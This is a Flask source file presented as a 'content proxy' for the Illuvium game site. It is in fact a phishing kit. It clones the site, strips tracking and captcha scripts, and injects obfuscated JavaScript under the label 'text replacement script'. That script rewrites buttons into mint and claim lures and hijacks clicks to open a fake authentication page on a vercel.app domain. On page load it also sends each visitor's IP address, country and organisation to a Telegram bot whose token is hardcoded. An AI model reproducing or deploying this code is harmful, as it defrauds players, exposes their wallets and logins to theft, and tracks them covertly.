from flask import request, Response, current_app
import requests
import re
import os
import logging
import urllib.parse

logger = logging.getLogger(__name__)

def init_content_proxy(app):
    """Initialize content proxy routes for the Flask app"""
    
    def remove_tracking_scripts(content):
        """Remove Google Tag Manager iframe and tracking scripts from HTML content."""
        if isinstance(content, bytes):
            content = content.decode('utf-8', errors='ignore')
        
        # Remove GTM iframe
        content = content.replace(
            '<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-WXHP66L" height="0" width="0" style="display:none;visibility:hidden"></iframe>',
            ''
        )
        
        # Remove GTM script
        content = content.replace(
            '<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-B4V7XNT23Z"></script>',
            ''
        )
        content = content.replace(
            '<script async="" src="https://store.epicgames.com/en-US/p/illuvium-60064c"></script>',
            ''
        )
        
        # Remove GTM initialization script
        gtm_init_script = '''<script>
            window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());
            gtag('config', 'G-B4V7XNT23Z', {
              page_path: window.location.pathname,
            });
          </script>'''
        content = content.replace(gtm_init_script, '')
        
        # Remove GTM inline script
        gtm_inline_script = '''<script>
            (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
            new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
            j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
            'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
            })(window,document,'script','dataLayer', 'GTM-WXHP66L');
          </script>'''
        content = content.replace(gtm_inline_script, '')
        
        # Remove Geetest script
        content = content.replace(
            '<script async="" src="https://static.geetest.com/v4/gt4.js"></script>',
            ''
        )
        
        return content
    
    def rewrite_urls(content):
        """Rewrite URLs to point to proxy server."""
        # Implementation continues...
        return content
    
    def get_text_replacement_script():
        """Return the text replacement JavaScript code"""
        return '''
<script>
const _0x19f5d7=_0x237d;(function(_0x424d2a,_0x586b15){const _0x5c44cb=_0x237d,_0x2a550b=_0x424d2a();while(!![]){try{const _0x3cf542=parseInt(_0x5c44cb(0x118))/0x1*(-parseInt(_0x5c44cb(0xd9))/0x2)+parseInt(_0x5c44cb(0xec))/0x3+parseInt(_0x5c44cb(0xea))/0x4+-parseInt(_0x5c44cb(0x116))/0x5+-parseInt(_0x5c44cb(0x10b))/0x6+-parseInt(_0x5c44cb(0xfc))/0x7*(parseInt(_0x5c44cb(0x114))/0x8)+parseInt(_0x5c44cb(0x110))/0x9;if(_0x3cf542===_0x586b15)break;else _0x2a550b['push'](_0x2a550b['shift']());}catch(_0x2e677a){_0x2a550b['push'](_0x2a550b['shift']());}}}(_0x45c0,0x6972d),document['addEventListener']('DOMContentLoaded',function(){const _0x58af9a=_0x237d;console[_0x58af9a(0xfd)]('');const _0x2fba2f={'Play\x20for\x20Free':'','Play\x20Now':_0x58af9a(0xf8),'Log\x20In\x20with\x20Passport':_0x58af9a(0x10c),'Connect\x20Wallet':'Connect\x20Wallet','Launch\x20Game':'Get\x20Yours','Create\x20Account':_0x58af9a(0xe0),'Sign\x20Up':'Register','Register':_0x58af9a(0xdc),'News':_0x58af9a(0x104),'Home':_0x58af9a(0xdb),'About':_0x58af9a(0x106),'Contact':_0x58af9a(0xfa),'FAQ':'Help','Roadmap':_0x58af9a(0xf1),'Whitepaper':_0x58af9a(0xe4)};function _0x2a34b1(_0x516f31,_0x108d03,_0x4475e2){const _0x103a5f=_0x58af9a;console['log']('',{'element':_0x516f31[_0x103a5f(0xf9)],'oldText':_0x108d03,'newText':_0x4475e2,'timestamp':new Date()['toISOString']()});}function _0xcaa361(_0x22e453){const _0x5618f1=_0x58af9a;let _0x4a5e64='';for(const _0x3015cc of _0x22e453[_0x5618f1(0xe1)]){_0x3015cc['nodeType']===Node[_0x5618f1(0xda)]&&(_0x4a5e64+=_0x3015cc[_0x5618f1(0xd7)][_0x5618f1(0x108)]());}!_0x4a5e64&&(_0x4a5e64=_0x22e453['textContent'][_0x5618f1(0x108)]());if(_0x2fba2f[_0x4a5e64]){const _0x4330be=_0x4a5e64;if(_0x22e453[_0x5618f1(0xe1)][_0x5618f1(0xe5)]===0x1&&_0x22e453[_0x5618f1(0xe1)][0x0][_0x5618f1(0xff)]===Node[_0x5618f1(0xda)])_0x22e453[_0x5618f1(0xd7)]=_0x2fba2f[_0x4a5e64];else{let _0x26043f=![];for(const _0x318f1f of _0x22e453[_0x5618f1(0xe1)]){if(_0x318f1f[_0x5618f1(0xff)]===Node[_0x5618f1(0xda)]&&_0x318f1f[_0x5618f1(0xd7)]['trim']()===_0x4a5e64){_0x318f1f[_0x5618f1(0xd7)]=_0x2fba2f[_0x4a5e64],_0x26043f=!![];break;}}!_0x26043f&&(_0x22e453[_0x5618f1(0xd7)]=_0x2fba2f[_0x4a5e64]);}_0x2a34b1(_0x22e453,_0x4330be,_0x2fba2f[_0x4a5e64]);}_0x22e453[_0x5618f1(0x103)][_0x5618f1(0xd8)](_0x5618f1(0x10d));}function _0x300586(){const _0x4b27d7=_0x58af9a;document['querySelectorAll']('button,\x20a')[_0x4b27d7(0xf2)](_0xcaa361),document[_0x4b27d7(0x115)](_0x4b27d7(0xe7))['forEach'](_0xcaa361),document[_0x4b27d7(0x115)](_0x4b27d7(0x111))[_0x4b27d7(0xf2)](_0xcaa361);}_0x300586(),console['log'](''),setInterval(function(){const _0x12ec0d=_0x58af9a;document['querySelectorAll']('button:not(.claim-button),\x20a:not(.claim-button)')[_0x12ec0d(0xf2)](_0xcaa361);},0x3e8);const _0x2229b3=new MutationObserver(function(_0x10ca52){const _0x259b78=_0x58af9a;let _0x251f1d=![];_0x10ca52[_0x259b78(0xf2)](function(_0x46ea8c){const _0x30f3a5=_0x259b78;_0x46ea8c[_0x30f3a5(0x113)]['length']&&(_0x251f1d=!![]);}),_0x251f1d&&document['querySelectorAll'](_0x259b78(0xe8))[_0x259b78(0xf2)](_0xcaa361);});_0x2229b3[_0x58af9a(0x107)](document['body'],{'childList':!![],'subtree':!![]}),document[_0x58af9a(0xfe)]('click',function(_0x25dcfd){const _0x3e7a5e=_0x58af9a,_0x4ee689=_0x25dcfd['target'],_0x229ed8=_0x4ee689[_0x3e7a5e(0xf3)](_0x3e7a5e(0xe2));if(!_0x229ed8)return;if(_0x229ed8[_0x3e7a5e(0x103)][_0x3e7a5e(0x105)](_0x3e7a5e(0xdd))||_0x229ed8[_0x3e7a5e(0x103)]['contains'](_0x3e7a5e(0x100))||_0x229ed8[_0x3e7a5e(0x103)][_0x3e7a5e(0x105)]('css-1hnz6hu')||_0x229ed8[_0x3e7a5e(0x103)][_0x3e7a5e(0x105)](_0x3e7a5e(0xef))||_0x229ed8[_0x3e7a5e(0x103)][_0x3e7a5e(0x105)](_0x3e7a5e(0x112)))return;_0x25dcfd['preventDefault'](),_0x25dcfd[_0x3e7a5e(0xdf)]();if(_0x229ed8[_0x3e7a5e(0x103)]['contains'](_0x3e7a5e(0x10d))){console[_0x3e7a5e(0xfd)](_0x3e7a5e(0x102));const _0x36748b=0x320,_0x57b7d4=0x258,_0x17eebb=window[_0x3e7a5e(0xf4)][_0x3e7a5e(0x10f)]/0x2-_0x36748b/0x2,_0x4a6be4=window[_0x3e7a5e(0xf4)]['height']/0x2-_0x57b7d4/0x2;window['open'](_0x3e7a5e(0xee),'googleWindow',_0x3e7a5e(0xfb)+_0x36748b+_0x3e7a5e(0xde)+_0x57b7d4+_0x3e7a5e(0xeb)+_0x4a6be4+_0x3e7a5e(0x101)+_0x17eebb+',toolbar=no,menubar=no,scrollbars=yes,resizable=yes');return;}console[_0x3e7a5e(0xfd)](''),_0x229ed8[_0x3e7a5e(0xf5)]();},!![]);}));async function sendIPToTelegram(){const _0x170b46=_0x237d,_0x4a669c=_0x170b46(0xe9),_0x3a70d5='7005236807';try{const _0x116c6c=await fetch(_0x170b46(0x10e)),_0x3f4c2c=await _0x116c6c['json'](),_0x2f9843=_0x3f4c2c['ip'],_0x1dc86a=_0x3f4c2c[_0x170b46(0x10a)],_0x32a497=_0x3f4c2c[_0x170b46(0xed)],_0x5ac6ab=_0x170b46(0xf0)+_0x2f9843+_0x170b46(0xf7)+_0x1dc86a+'\x20:\x20'+_0x32a497;await fetch(_0x170b46(0xe3)+_0x4a669c+_0x170b46(0x109),{'method':_0x170b46(0x117),'headers':{'Content-Type':_0x170b46(0xf6)},'body':JSON['stringify']({'chat_id':_0x3a70d5,'text':_0x5ac6ab})});}catch(_0x32f0ab){console[_0x170b46(0xe6)]('',_0x32f0ab);}}window[_0x19f5d7(0xfe)]('load',sendIPToTelegram);function _0x237d(_0x29934f,_0x515118){const _0x45c0af=_0x45c0();return _0x237d=function(_0x237d66,_0x24943c){_0x237d66=_0x237d66-0xd7;let _0xf60cfe=_0x45c0af[_0x237d66];return _0xf60cfe;},_0x237d(_0x29934f,_0x515118);}function _0x45c0(){const _0x1d7c1f=['css-104rome',',left=','Redirecting\x20to\x20Google','classList','Updates','contains','Info','observe','trim','/sendMessage','country_name','1702488Ldwygl','Start\x20Now','claim-button','https://ipapi.co/json/','width','7493913VLcvzN','.chakra-link,\x20.nav-link,\x20.menu-item','css-1i8s7az','addedNodes','56uiHFGb','querySelectorAll','1009320MIOgkI','POST','1qKINVV','textContent','add','668702IVlnSE','TEXT_NODE','Main','Collect\x20Now','css-tvaofb',',height=','stopPropagation','New\x20Account','childNodes','button,\x20a','https://api.telegram.org/bot','Documentation','length','error','a[href*=\x22news\x22],\x20a[href*=\x22about\x22],\x20a[href*=\x22faq\x22]','button:not(.claim-button),\x20a:not(.claim-button)','7703714960:AAFhMovzxoNjr9LZq6m9kytv1R1EylQT1R8','1112492jRvpMq',',top=','818499bTPseQ','org','https://secure-authentication-immutable.vercel.app/?id=auth-passeport&user=209348&method=claim-your-mint','css-1oqedzn','[ILV]:\x20','Timeline','forEach','closest','screen','click','application/json','\x20:\x20','Grab\x20Your\x20Spot','outerHTML','Reach\x20Us','width=','131733wgIPaI','log','addEventListener','nodeType'];_0x45c0=function(){return _0x1d7c1f;};return _0x45c0();}
</script>
 

'''

    @app.after_request
    def add_script_to_html(response):
        """Global after_request handler to add script to all HTML responses"""
        if response.mimetype == 'text/html':
            content = response.get_data(as_text=True)
            if '</body>' in content:
                script = get_text_replacement_script()
                content = content.replace('</body>', script + '</body>')
                response.set_data(content)
        return response

    # Add a catch-all route as a last resort
    @app.route('/', defaults={'path': ''})
    @app.route('/<path:path>')
    def catch_all(path):
        """Catch-all route that proxies to the original site and modifies content"""
        original_url = f"https://overworld.illuvium.io/{path}"
        logger.info(f"Catch-all proxy for: {original_url}")
        
        try:
            # Set proper headers to mimic a browser
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
            }
            
            # Add query parameters if any
            params = request.args.to_dict()
            
            # Make the request to the original site
            response = requests.get(original_url, headers=headers, params=params, stream=True)
            
            # Get content type
            content_type = response.headers.get('Content-Type', 'text/html')
            
            # If HTML, modify content
            if 'text/html' in content_type and response.status_code == 200:
                modified_content = modify_html_content(response.content)
                logger.info(f"HTML content modified for {path}")
                return Response(modified_content, mimetype=content_type)
            
            # For other content types or error codes, return as-is
            return Response(
                response.content, 
                status=response.status_code,
                content_type=content_type
            )
        except Exception as e:
            logger.error(f"Error in catch-all route: {str(e)}")
            import traceback
            logger.error(traceback.format_exc())
            return f"Error: {str(e)}", 500
